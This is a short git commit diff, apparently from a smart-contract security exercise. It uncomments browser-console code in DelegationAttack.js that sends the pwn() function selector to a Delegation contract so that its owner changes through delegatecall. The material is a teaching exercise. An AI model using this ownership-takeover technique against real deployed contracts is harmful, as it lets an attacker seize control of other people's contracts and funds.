5854b1c2d00faa927355f825a957393bce372300
Your Name <you@example.com>
2022-09-20 15:19:36 +1000

    Vault attack

--- contracts/DelegationAttack.js
+++ contracts/DelegationAttack.js
@@ -3,10 +3,7 @@
 /// @dev This could only be done through browsers developer tools as attacking
 /// through another smart contract the owner is getting set the calling contract's address
 
-// await contract.owner()
-
-// var pwnDelegation = web3.utils.keccak256("pwn()")
-
-// contract.sendTransaction({data: pwnDelegation})
-
-// await contract.owner()
+await contract.owner()
+var pwnDelegation = web3.utils.keccak256("pwn()")
+contract.sendTransaction({data: pwnDelegation})
+await contract.owner()
